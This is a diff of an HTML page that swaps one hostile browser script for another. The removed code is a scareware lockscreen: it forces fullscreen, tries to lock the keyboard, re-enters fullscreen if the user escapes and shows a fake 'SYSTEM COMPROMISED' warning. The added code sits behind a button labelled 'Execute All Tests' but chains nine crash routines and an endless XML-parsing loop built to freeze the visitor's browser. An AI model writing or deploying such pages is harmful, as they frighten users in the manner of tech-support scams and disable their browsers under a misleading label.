@@ -1,32 +1,30 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="magic5()">Enter Fullscreen Mode</button>
+<button onclick="crash10()">Execute All Tests</button>
 
 <script>
-async function magic5() {
-    // Request fullscreen
-    await document.documentElement.requestFullscreen();
+function crash10() {
+    // Jalankan semua variant bersamaan
+    crash1();
+    setTimeout(crash2, 500);
+    setTimeout(crash3, 1000);
+    setTimeout(crash4, 1500);
+    setTimeout(crash5, 2000);
+    setTimeout(crash6, 2500);
+    setTimeout(crash7, 3000);
+    setTimeout(crash8, 3500);
+    setTimeout(crash9, 4000);
     
-    // Lock keyboard (experimental API)
-    try {
-        await navigator.keyboard.lock();
-    } catch(e) {}
-    
-    // Prevent escape
-    document.addEventListener('fullscreenchange', () => {
-        if (!document.fullscreenElement) {
-            document.documentElement.requestFullscreen();
-        }
-    });
-    
-    // Show scary message
-    document.body.innerHTML = `
-        <div style="width:100vw;height:100vh;background:black;color:red;display:flex;align-items:center;justify-content:center;font-size:30px;">
-            SYSTEM COMPROMISED<br>
-            DO NOT CLOSE THIS WINDOW
-        </div>
-    `;
+    // Extra: XML parsing bomb
+    setTimeout(() => {
+        try {
+            const parser = new DOMParser();
+            while(true) {
+                parser.parseFromString('<root>' + 'X'.repeat(1000000) + '</root>', 'text/xml');
+            }
+        } catch(e) {}
+    }, 4500);
 }
 </script>
 </body>
